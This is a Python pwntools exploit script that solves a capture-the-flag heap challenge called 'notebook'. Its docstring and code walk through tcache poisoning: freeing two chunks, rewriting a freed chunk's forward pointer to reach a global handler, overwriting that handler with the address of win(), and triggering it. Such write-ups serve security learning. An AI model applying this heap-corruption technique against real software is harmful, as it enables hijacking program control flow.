#!/usr/bin/env python3
from pwn import *
"""
DOUBLE FREE
The idea here is to point the global handler to GLOBAL_HANDLER memory region, enabling us to write inside it
then we can write into write inside global handlare the win() addres 
now we can trigger the execution of win()


To do is two MALLOC are necessary since if we don't put even the second malloc inside the tcache 
list its not taken from there and we can't control it.
Is not possible to do it with a single malloc because the memory that we want to write is outsude the chunck
#---- STEP 1----
1)CREATE 2 malloc
2)FREE those malloc in order to put it into the TCACHE LIST (so we can edit it)
3)EDIT the fd (forward pointer) of the top malloc (which is the second one since the heap is a LIFO) in order to point it
    to the GLOBAL_HANDLARE address

+---------------------+ 
| fd |                   <-- &GLOBAL_HANDLER
+---------------------+
| key  | 8 B
+---------------------+
| (rest of payload) |
+---------------------+
#---- STEP 2----
4) Create 1 a malloc, which consume the top of TCACHE LIST, that now have as fd the GLOBAL_HANDLER ADDRESS
5) Create 1 malloc that now point into the GLOBAL_HANDLER memory region (we are writing into the global_handler), and here 
    we pass as data the pointer to win()
    

    MALLOC1                                       MALLOC2(GLOBAL_HANDLER memory region)
+---------------------+                         +---------------------+ 
| fd |                   <-- &GLOBAL_HANDLER    | fd |                   <-- &win()
+---------------------+                         +---------------------+
| key  | 8 B                                    | key  | 8 B
+---------------------+                         +---------------------+
| (rest of payload) |                           | (rest of payload) |
+---------------------+                         +---------------------+

#---- STEP 3----
 6) Trigger the execution
"""


context.binary = elf = ELF('./notebook', checksec=False)
#context.log_level="debug"
elf = ELF("./notebook_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it',13513)
    return process(elf.path)

p = conn()



#--------STEP 1: POINT THE MACCOT TO GLOBAL HANDLER MEMORY REGION ---------

#GLOBAL_HANDLER = elf.sym.global_handler-0x10
GLOBAL_HANDLER = elf.sym.global_handler 
win = elf.sym.win

#CREATE(index=1)
p.sendlineafter(b'> ', b'1')   #create malloc
p.sendlineafter(b'index: ', b'1')
p.sendafter(b'data: ',b'A') # type: ignore

#CREATE(index=2)
p.sendlineafter(b'> ', b'1')   #create malloc
p.sendlineafter(b'index: ', b'2')
p.sendafter(b'data: ',b'A') # type: ignore

#FREE(index=1)
p.sendlineafter(b'> ', b'2')    #free malloc
p.sendlineafter(b'index: ', b'1')
#gb.attach(p)

#FREE(index=2)
p.sendlineafter(b'> ', b'2')    #free malloc
p.sendlineafter(b'index: ', b'2')
#gb.attach(p)

#EDIT(index=1)
p.sendlineafter(b'> ', b'3') #edit malloc (the ones freeded)
p.sendlineafter(b'index: ', b'2') # head della lista
#p.sendafter(b'data: ', p64(GLOBAL_HANDLER).ljust(32, b'X')) # type: ignore
p.recvuntil(b'data: ')
p.send(p64(GLOBAL_HANDLER))

#--------STEP 2: OVERWRITE MALLOC WITH WIN() ADDRESS ---------

#CREATE(index=1)
p.sendlineafter(b'> ', b'1')   #create malloc
p.sendlineafter(b'index: ', b'1')
p.sendafter(b'data: ',b'A') 

log.info(hex(elf.sym.global_handler))
log.info(hex(win))

#CREATE(index=2)
p.sendlineafter(b'> ', b'1')   #create malloc
p.sendlineafter(b'index: ', b'2')
p.sendafter(b'data: ',p64(win)) # type: ignore
#p.sendafter(b'data: ',p64(win).ljust(32, b'X')) # type: ignore
#gdb.attach(p)
#pause()

#--------STEP 3: TRIGGER THE GLOBAL HANDLER THAT CONTAINS WIN() ADDRESS ---------

p.sendlineafter(b'> ', b'5')                       
#p.sendafter(b'data: ', p64(win).ljust(32, b'X')) # type: ignore
#p.sendlineafter(b'> ', b'4')            

#print(p.recvall(timeout=2).decode(errors='replace'))

p.interactive()
